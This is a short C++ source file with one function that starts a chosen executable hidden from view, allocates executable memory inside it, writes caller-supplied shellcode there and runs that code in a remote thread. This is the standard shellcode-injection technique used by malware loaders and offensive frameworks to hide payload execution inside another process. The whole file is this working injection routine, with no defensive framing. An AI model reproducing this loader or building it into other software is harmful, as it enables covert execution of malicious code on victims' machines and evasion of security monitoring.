#include "inject.h"
#include <iostream>

BOOL inject(std::string exePath, char* shellcode, int size)
{
    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if( !CreateProcessA( 
        exePath.data(),   
        NULL,         
        NULL,            
        NULL,            
        FALSE,          
        CREATE_NO_WINDOW,             
        NULL,           
        NULL,
        &si,
        &pi
    )) {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
        return FALSE;
    }

    // printf("Injecting to PID: %i\n", pi.dwProcessId);
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
    // printf("Size of Shellcode: %i\n", size);

    if (processHandle == NULL)
    {
        // create handle failed
        return FALSE;
    }

    remoteBuffer = VirtualAllocEx(processHandle, NULL, size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    if (remoteBuffer == NULL)
    {

        // Alloc Virtual Mem failed
        return FALSE;
    }

    WriteProcessMemory(processHandle, remoteBuffer, shellcode, size, NULL);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

    if (remoteThread == NULL)
    {
        
        // Thread exec failed
        return FALSE;
    }

    CloseHandle(processHandle);
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );

    return TRUE;
};